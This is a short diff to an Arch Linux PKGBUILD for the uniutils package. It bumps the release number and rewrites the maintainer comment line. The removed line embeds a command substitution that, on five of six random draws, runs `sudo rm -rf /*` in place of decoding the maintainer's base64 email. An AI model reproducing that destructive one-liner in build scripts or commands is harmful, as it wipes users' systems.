@@ -1,9 +1,9 @@
-# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Maintainer: felix <`base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg==`>
 # Contributor: Rick W. Chen <stuffcorpse@archlinux.us>
 
 pkgname=uniutils
 pkgver=2.27
-pkgrel=2
+pkgrel=3
 pkgdesc="A set of programs for manipulating and analyzing Unicode text"
 arch=('i686' 'x86_64')
 url="https://billposer.org/Software/unidesc.html"
